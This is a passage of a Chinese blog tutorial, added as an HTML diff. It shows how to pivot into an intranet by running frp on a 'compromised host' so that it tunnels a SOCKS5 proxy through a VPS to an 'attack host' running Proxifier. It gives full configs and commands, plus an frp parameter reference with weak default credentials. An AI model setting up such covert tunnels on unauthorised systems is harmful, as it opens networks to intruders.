@@ -1,0 +1,1655 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="frp+proxifier实现内网socks5反向代理, citytwilight">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>frp+proxifier实现内网socks5反向代理 | citytwilight</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">citytwilight</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">citytwilight</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">frp+proxifier实现内网socks5反向代理</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F/">
+                                <span class="chip bg-color">代理穿透</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%86%85%E7%BD%91/" class="post-category">
+                                内网
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2022-11-07
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="frp-proxifier实现内网socks5反向代理"><a href="#frp-proxifier实现内网socks5反向代理" class="headerlink" title="frp+proxifier实现内网socks5反向代理"></a>frp+proxifier实现内网socks5反向代理</h1><p>客户端：</p>
+<p>部署在需要穿透的内网服务所在的机器上（需要代理出来流量的内网机器）</p>
+<p>frp客户端为frpc</p>
+<p>服务端：</p>
+<p>部署在具有公网 IP 的机器上</p>
+<p>frp服务端为frps</p>
+<h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><h3 id="正向代理与反向代理"><a href="#正向代理与反向代理" class="headerlink" title="正向代理与反向代理"></a>正向代理与反向代理</h3><h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>正向代理类似一个跳板机，代理访问外部资源（比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到代理服，代理服务器能够访问谷歌，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了）</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211071713921.png" alt="img"></p>
+<h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/1799690-20210311114602583-490107063.png" alt="img"></p>
+<p>frp 是什么？ </p>
+<p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p>
+<h3 id="为什么使用-frp？"><a href="#为什么使用-frp？" class="headerlink" title="为什么使用 frp？"></a>为什么使用 frp？</h3><p>通过在具有公网 IP 的节点上部署 frp 服务端，可以轻松地将内网服务穿透到公网，同时提供诸多专业的功能特性，这包括：</p>
+<ul>
+<li>客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。</li>
+<li>采用 TCP 连接流式复用，在单个连接间承载更多请求，节省连接建立时间。</li>
+<li>代理组间的负载均衡。</li>
+<li>端口复用，多个服务通过同一个服务端端口暴露。</li>
+<li>多个原生支持的客户端插件（静态文件查看，HTTP、SOCK5 代理等），便于独立使用 frp 客户端完成某些工作。</li>
+<li>高度扩展性的服务端插件系统，方便结合自身需求进行功能扩展。</li>
+<li>服务端和客户端 UI 页面。</li>
+</ul>
+<h3 id="什么是Proxifier？"><a href="#什么是Proxifier？" class="headerlink" title="什么是Proxifier？"></a>什么是Proxifier？</h3><p>Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。支持 64位系统，支持Xp，Vista，Win7，MAC OS ,支持socks4，socks5，http代理协议，支持TCP，UDP协议，可以指定端口，指定IP，指定域名，指定程序等运行模式，兼容性非常好，和之前介绍的<a target="_blank" rel="noopener" href="https://www.williamlong.info/archives/2024.html">SocksCap</a>属于同类软件，不过SocksCap已经很久没更新了。有许多网络应用程序不支持通过代理服务器工作，Proxifier 解决了这些问题和所有限制，让您有机会不受任何限制使用你喜爱的软件。此外，它让你获得了额外的<a target="_blank" rel="noopener" href="https://www.williamlong.info/tag/Security.html">网络安全</a>控制，创建代理隧道，并添加使用更多网络功能的权力。</p>
+<h2 id="使用frp-proxifier实现内网socks5反向代理"><a href="#使用frp-proxifier实现内网socks5反向代理" class="headerlink" title="使用frp+proxifier实现内网socks5反向代理"></a>使用frp+proxifier实现内网socks5反向代理</h2><h3 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h3><p>1、 被入侵内网主机：192.168.0.57</p>
+<p>2、 VPS公网服务器：（ip为自己vps的ip）</p>
+<p>3、攻击主机：192.168.0.105</p>
+<p>frp下载地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
+<p>frp介绍文档及各类参数详解：<a target="_blank" rel="noopener" href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p>
+<p>proxifier下载地址：<a target="_blank" rel="noopener" href="https://www.proxifier.com/">https://www.proxifier.com/</a></p>
+<p>（注：frp客户端和服务端尽量使用最新版本或一致的版本，要不有可能出现兼容问题）</p>
+<h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><p>1、frp是有一个客户端，一个服务器端，首先配置服务器端的frp配置；frpc后面跟着一个c，大家应该知道是client的首字母，frps也是一样server；这样就容易理解所对应的文件是干嘛的了，frpc.ini和frps.ini分别对应客户端和服务器端的配置文件；</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/image.png"></p>
+<p>2、在服务端（vps）上下载frp并配置frps.ini文件。</p>
+<p>（1）下载不多说直接下载下来上传上去就行。（上传对应系统的frp压缩包就好）</p>
+<pre class="line-numbers language-none"><code class="language-none">[common]
+Bind_addr &#x3D; 0.0.0.0   #服务端监听地址 默认0.0.0.0
+bind_port &#x3D; 7000    #服务端监听端口
+dashboard_port &#x3D; 7500  #状态以及代理统计信息展示,vpsip:7500可查看详情
+
+dashboard_user &#x3D; admin     #访问用户
+dashboard_pwd &#x3D; password    # dashboard_pwd访问密码
+log_file &#x3D; .&#x2F;frps.log    #log_file日志文件
+
+log_level &#x3D; info    # log_level记录的日志级别
+log_max_days &#x3D; 3     # log_max_days日志留存3天
+authentication_timeout &#x3D; 0     #authentication_timeout超时时间
+
+#max_pool_count最大链接池,每个代理预先与后端服务器建立起指定数量的最大链接数
+max_pool_count &#x3D; 50
+
+allow_ports &#x3D; 40000-50000  #允许代理绑定的服务端端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>（2）vps配置frps.ini文件（其实命名可以随便命名的只要是ini文件就好）</p>
+<pre class="line-numbers language-none"><code class="language-none">[common]
+Bind_addr &#x3D; 0.0.0.0   #服务端监听地址 默认0.0.0.0
+bind_port &#x3D; 7000    #服务端监听端口
+
+dashboard_port &#x3D; 7500  #状态以及代理统计信息展示,vpsip+7500可查看详情
+dashboard_user &#x3D; admin     #访问用户
+dashboard_pwd &#x3D; password    # dashboard_pwd访问密码
+
+allow_ports &#x3D; 40000-50000  #允许代理绑定的服务端端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/SA%5BMUZ7AXVX8Y%7B~N%5DLF_YAU.jpg" alt="img">    </p>
+<p>（3）vps执行命令开启frps等待连接</p>
+<p>./frps -c frps.ini</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/image-20221107194844467.png"></p>
+<p>3、在客户端（被入侵内网主机）上下载frp并配置frpc.ini文件</p>
+<p>（1）被入侵内网主机配置frpc.ini文件</p>
+<pre class="line-numbers language-none"><code class="language-none">[common]
+server_addr &#x3D; vps的ip地址     #连接服务端的地址
+server_port &#x3D; 7000     #连接服务端的端口
+tls_enable &#x3D; ture      #启用 TLS 协议加密连接
+pool_count &#x3D; 5    #连接池大小
+
+[plugin_socks]
+type &#x3D; tcp
+remote_port &#x3D; 46075
+plugin &#x3D; socks5
+plugin_user &#x3D; admin
+plugin_passwd &#x3D; admin123
+use_encryption &#x3D; true
+use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/image-20221107195844080.png" alt="image-20221107195844080">    </p>
+<p>（2）被入侵内网主机执行命令连接vps</p>
+<p>./frpc -c frpc.ini</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/Q55GKLK4VFJ32E2Q1E81SUS.png"></p>
+<p>（3）被入侵内网主机访问VPS:7500查看是否连接成功（或看vps的执行完frps界面有没有报错，有报错的话按照报错提示去修改就好了。）</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/image-20221107195411901.png"></p>
+<p>（4）连接成功后vps显示</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/image-20221107200034969.png"></p>
+<p>4、攻击主机配置proxifier</p>
+<p>（1）攻击主机配置ip、端口、连接方式、账号密码</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/image-20221107200356431.png" alt="image-20221107200356327"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/image-20221107200213521.png" alt="image-20221107200213521">    </p>
+<p>check</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/image-20221107200315904.png" alt="image-20221107200315904">    </p>
+<p>tips：默认check的是google 可修改为百度进行check</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/image-20221107200500158.png" alt="image-20221107200500158"></p>
+<p>（2）攻击主机配置规则</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/image-20221107200625999.png" alt="image-20221107200625999"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12562721/1667806793197-289b3c2c-b900-4b90-b6a4-1043ff3aaeef.png" alt="img">    </p>
+<p>（3） 攻击主机代理成功后访问vps:7500</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/image-20221107200804794.png" alt="image-20221107200804794"></p>
+<p>代理成功vps截图</p>
+<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/image-20221107201122731.png"></p>
+<h2 id="frp配置文件参数"><a href="#frp配置文件参数" class="headerlink" title="frp配置文件参数"></a>frp配置文件参数</h2><h3 id="服务端frps配置文件参数："><a href="#服务端frps配置文件参数：" class="headerlink" title="服务端frps配置文件参数："></a>服务端frps配置文件参数：</h3><pre class="line-numbers language-none"><code class="language-none"># [common] 是必需的
+[common]
+# ipv6的文本地址或主机名必须括在方括号中
+# 如&quot;[::1]:80&quot;, &quot;[ipv6-host]:http&quot; 或 &quot;[ipv6-host%zone]:80&quot;
+bind_addr &#x3D; 0.0.0.0
+bind_port &#x3D; 7000
+
+# udp nat 穿透端口
+bind_udp_port &#x3D; 7001
+
+# 用于 kcp 协议 的 udp 端口，可以与 &quot;bind_port&quot; 相同
+# 如果此项不配置, 服务端的 kcp 将不会启用
+kcp_bind_port &#x3D; 7000
+
+# 指定代理将侦听哪个地址，默认值与 bind_addr 相同
+# proxy_bind_addr &#x3D; 127.0.0.1
+
+# 如果要支持虚拟主机，必须设置用于侦听的 http 端口（非必需项）
+# 提示：http端口和https端口可以与 bind_port 相同
+vhost_http_port &#x3D; 80
+vhost_https_port &#x3D; 443
+
+# 虚拟 http 服务器的响应头超时时间（秒），默认值为60s
+# vhost_http_timeout &#x3D; 60
+
+# 设置 dashboard_addr 和 dashboard_port 用于查看 frps 仪表盘
+# dashboard_addr 默认值与 bind_addr 相同
+# 只有 dashboard_port 被设定，仪表盘才能生效
+dashboard_addr &#x3D; 0.0.0.0
+dashboard_port &#x3D; 7500
+
+# 设置仪表盘用户密码，用于基础认证保护，默认为 admin&#x2F;admin
+dashboard_user &#x3D; admin
+dashboard_pwd &#x3D; admin
+
+# 仪表板资产目录(仅用于 debug 模式下)
+# assets_dir &#x3D; .&#x2F;static
+# 控制台或真实日志文件路径，如.&#x2F;frps.log
+log_file &#x3D; .&#x2F;frps.log
+
+# 日志级别，分为trace（跟踪）、debug（调试）、info（信息）、warn（警告）、error（错误）
+log_level &#x3D; info
+
+# 最大日志记录天数
+log_max_days &#x3D; 3
+
+# 认证 token
+token &#x3D; 12345678
+
+# 心跳配置, 不建议对默认值进行修改
+# heartbeat_timeout 默认值为 90
+# heartbeat_timeout &#x3D; 90
+
+# 允许 frpc(客户端) 绑定的端口，不设置的情况下没有限制
+allow_ports &#x3D; 2000-3000,3001,3003,4000-50000
+
+# 如果超过最大值，每个代理中的 pool_count 将更改为 max_pool_count
+max_pool_count &#x3D; 5
+
+# 每个客户端可以使用最大端口数，默认值为0，表示没有限制
+max_ports_per_client &#x3D; 0
+
+# 如果 subdomain_host 不为空, 可以在客户端配置文件中设置 子域名类型为 http 还是 https
+# 当子域名为 test 时, 用于路由的主机为 test.frps.com
+subdomain_host &#x3D; frps.com
+
+# 是否使用 tcp 流多路复用，默认值为 true
+tcp_mux &#x3D; true
+
+# 对 http 请求设置自定义 404 页面
+# custom_404_page &#x3D; &#x2F;path&#x2F;to&#x2F;404.html
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="客户端frpc配置文件参数"><a href="#客户端frpc配置文件参数" class="headerlink" title="客户端frpc配置文件参数"></a>客户端frpc配置文件参数</h3><pre class="line-numbers language-none"><code class="language-none"># [common] 是必需的
+[common]
+# ipv6的文本地址或主机名必须括在方括号中
+# 如&quot;[::1]:80&quot;, &quot;[ipv6-host]:http&quot; 或 &quot;[ipv6-host%zone]:80&quot;
+server_addr &#x3D; 0.0.0.0
+server_port &#x3D; 7000
+
+# 如果要通过 http 代理或 socks5 代理连接 frps，可以在此处或全局代理中设置 http_proxy
+# 只支持 tcp协议
+# http_proxy &#x3D; http:&#x2F;&#x2F;user:passwd@192.168.1.128:8080
+# http_proxy &#x3D; socks5:&#x2F;&#x2F;user:passwd@192.168.1.128:1080
+
+# 控制台或真实日志文件路径，如.&#x2F;frps.log
+log_file &#x3D; .&#x2F;frpc.log
+
+# 日志级别，分为trace（跟踪）、debug（调试）、info（信息）、warn（警告）、error（错误）
+log_level &#x3D; info
+
+# 最大日志记录天数
+log_max_days &#x3D; 3
+
+# 认证 token
+token &#x3D; 12345678
+
+# 设置能够通过 http api 控制客户端操作的管理地址
+admin_addr &#x3D; 127.0.0.1
+admin_port &#x3D; 7400
+admin_user &#x3D; admin
+admin_pwd &#x3D; admin
+
+# 将提前建立连接，默认值为 0
+pool_count &#x3D; 5
+
+# 是否使用 tcp 流多路复用，默认值为 true，必需与服务端相同
+tcp_mux &#x3D; true
+
+# 在此处设置用户名后，代理名称将设置为 &#123;用户名&#125;.&#123;代理名&#125;
+user &#x3D; your_name
+
+# 决定第一次登录失败时是否退出程序，否则继续重新登录到 frps
+# 默认为 true
+login_fail_exit &#x3D; true
+
+# 用于连接到服务器的通信协议
+# 目前支持 tcp&#x2F;kcp&#x2F;websocket, 默认 tcp
+protocol &#x3D; tcp
+
+# 如果 tls_enable 为 true, frpc 将会通过 tls 连接 frps
+tls_enable &#x3D; true
+
+# 指定 DNS 服务器
+# dns_server &#x3D; 8.8.8.8
+
+# 代理名, 使用 &#39;,&#39; 分隔
+# 默认为空, 表示全部代理
+# start &#x3D; ssh,dns
+
+# 心跳配置, 不建议对默认值进行修改
+# heartbeat_interval 默认为 10 heartbeat_timeout 默认为 90
+# heartbeat_interval &#x3D; 30
+# heartbeat_timeout &#x3D; 90
+
+# &#39;ssh&#39; 是一个特殊代理名称
+[ssh]
+# 协议 tcp | udp | http | https | stcp | xtcp, 默认 tcp
+type &#x3D; tcp
+local_ip &#x3D; 127.0.0.1
+local_port &#x3D; 22
+# 是否加密, 默认为 false
+use_encryption &#x3D; false
+# 是否压缩
+use_compression &#x3D; false
+# 服务端端口
+remote_port &#x3D; 6001
+# frps 将为同一组中的代理进行负载平衡连接
+group &#x3D; test_group
+# 组应该有相同的组密钥
+group_key &#x3D; 123456
+# 为后端服务开启健康检查, 目前支持 &#39;tcp&#39; 和 &#39;http&#39;
+# frpc 将连接本地服务的端口以检测其健康状态
+health_check_type &#x3D; tcp
+# 健康检查连接超时
+health_check_timeout_s &#x3D; 3
+# 连续 3 次失败, 代理将会从服务端中被移除
+health_check_max_failed &#x3D; 3
+# 健康检查时间间隔
+health_check_interval_s &#x3D; 10
+
+[ssh_random]
+type &#x3D; tcp
+local_ip &#x3D; 127.0.0.1
+local_port &#x3D; 22
+# 如果 remote_port 为 0 ,frps 将为您分配一个随机端口
+remote_port &#x3D; 0
+
+# 如果要暴露多个端口, 在区块名称前添加 &#39;range:&#39; 前缀
+# frpc 将会生成多个代理，如 &#39;tcp_port_6010&#39;, &#39;tcp_port_6011&#39;
+[range:tcp_port]
+type &#x3D; tcp
+local_ip &#x3D; 127.0.0.1
+local_port &#x3D; 6010-6020,6022,6024-6028
+remote_port &#x3D; 6010-6020,6022,6024-6028
+use_encryption &#x3D; false
+use_compression &#x3D; false
+
+[dns]
+type &#x3D; udp
+local_ip &#x3D; 114.114.114.114
+local_port &#x3D; 53
+remote_port &#x3D; 6002
+use_encryption &#x3D; false
+use_compression &#x3D; false
+
+[range:udp_port]
+type &#x3D; udp
+local_ip &#x3D; 127.0.0.1
+local_port &#x3D; 6010-6020
+remote_port &#x3D; 6010-6020
+use_encryption &#x3D; false
+use_compression &#x3D; false
+
+# 将域名解析到 [server_addr] 可以使用 http:&#x2F;&#x2F;web01.yourdomain.com 访问 web01
+[web01]
+type &#x3D; http
+local_ip &#x3D; 127.0.0.1
+local_port &#x3D; 80
+use_encryption &#x3D; false
+use_compression &#x3D; true
+# http 协议认证
+http_user &#x3D; admin
+http_pwd &#x3D; admin
+# 如果服务端域名为 frps.com, 可以通过 http:&#x2F;&#x2F;test.frps.com 来访问 [web01]
+subdomain &#x3D; web01
+custom_domains &#x3D; web02.yourdomain.com
+# locations 仅可用于HTTP类型
+locations &#x3D; &#x2F;,&#x2F;pic
+host_header_rewrite &#x3D; example.com
+# params with prefix &quot;header_&quot; will be used to update http request headers
+header_X-From-Where &#x3D; frp
+health_check_type &#x3D; http
+# frpc 将会发送一个 GET http 请求 &#39;&#x2F;status&#39; 来定位http服务
+# http 服务返回 2xx 状态码时即为存活
+health_check_url &#x3D; &#x2F;status
